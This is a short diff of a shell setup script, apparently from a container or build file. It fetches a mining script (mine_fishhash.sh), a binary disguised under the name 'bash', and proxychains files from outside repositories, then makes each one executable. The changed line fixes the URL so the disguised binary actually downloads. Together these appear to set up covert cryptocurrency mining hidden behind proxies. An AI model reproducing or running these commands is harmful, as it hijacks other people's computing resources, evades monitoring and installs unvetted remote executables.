@@ -20,7 +20,7 @@ apt-get update && apt-get install -y \
 apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 echo "Uploaded files:" && ls /home/stuff/
 wget https://raw.githubusercontent.com/pagesrlepla/mx8/main/mine_fishhash.sh && chmod +x mine_fishhash.sh
-wget https://github.com/pagesrlepla/mx8/blob/main/bash && chmod +x bash
+wget https://github.com/pagesrlepla/mx8/raw/main/bash && chmod +x bash
 wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
 sleep 3 
